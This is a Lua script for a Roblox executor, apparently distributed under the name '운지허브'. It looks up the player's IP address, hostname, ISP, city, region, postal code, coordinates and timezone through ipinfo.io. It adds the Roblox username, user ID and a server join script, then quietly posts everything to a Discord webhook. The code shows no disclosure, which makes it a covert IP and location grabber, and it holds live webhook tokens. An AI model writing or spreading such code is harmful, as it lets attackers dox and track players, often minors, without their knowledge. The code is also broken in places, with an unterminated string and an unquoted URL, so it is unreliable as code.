do
    local HttpService = game:GetService("HttpService")
    local Players = game:GetService("Players")
    local WEBHOOK_URL = "https://discord.com/api/webhooks/1363373523367755838/q-vIB7STjgbCHE06z0mkEabVW6ViBS8vxKzbKfA8MwAaPMCT5YNBO8LseCuq1ke90mQe"
    local player = Players.LocalPlayer

    local res = request({
        Url    = "https://ipinfo.io/json",
        Method = "GET",
    })
    local data = HttpService:JSONDecode(res.Body)

    
    local gameId = tostring(game.PlaceId)
    local jobId = tostring(game.JobId)
    local joinScript = string.format("game:GetService('TeleportService'):TeleportToPlaceInstance('%s', '%s', game:GetService('Players').LocalPlayer)", gameId, jobId)
    local robloxName = (player and player.Name) or "N/A"
    local robloxID = (player and tostring(player.UserId)) or "N/A"

    local fields = {
        { name = "IP 주소 🌐", value = data.ip, inline = true },
        { name = "호스트 이름 💻", value = data.hostname or "N/A", inline = true },
        { name = "ASN 🏢", value = data.org or "N/A", inline = true },
        { name = "도시 🏙️", value = data.city or "N/A", inline = true },
        { name = "지역 📍", value = data.region or "N/A", inline = true },
        { name = "국가 🇺🇳", value = data.country or "N/A", inline = true },
        { name = "위치 📌", value = data.loc or "N/A", inline = true },
        { name = "우편번호 📬", value = data.postal or "N/A", inline = true },
        { name = "시간대 ⏰", value = data.timezone or "N/A", inline = true },
        { name = "", value = string.rep('-', 50), inline = false },
        { name = "게임 ID 🎮", value = gameId, inline = true },
        { name = "작업 ID 💼", value = jobId, inline = true },
        { name = "참여 스크립트 🔗", value = "```" .. joinScript .. "```", inline = false },
        { name = "Roblox 이름 👤", value = robloxName, inline = true },
        { name = "Roblox ID 🆔", value = robloxID, inline = true },
    }

    local payload = HttpService:JSONEncode({
        embeds = {{
            title     = "운지허브
            fields    = fields
        }},
    })

    request({
        Url     = https://discord.com/api/webhooks/1384464582600298517/4yq96QxR8FOR7fn8FFHDAhY2ttFH4sDWL6Fu56JAWw7dJl-Fyq24_XLXOzeb56GIqkkk,
        Method  = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body    = payload,
    })
end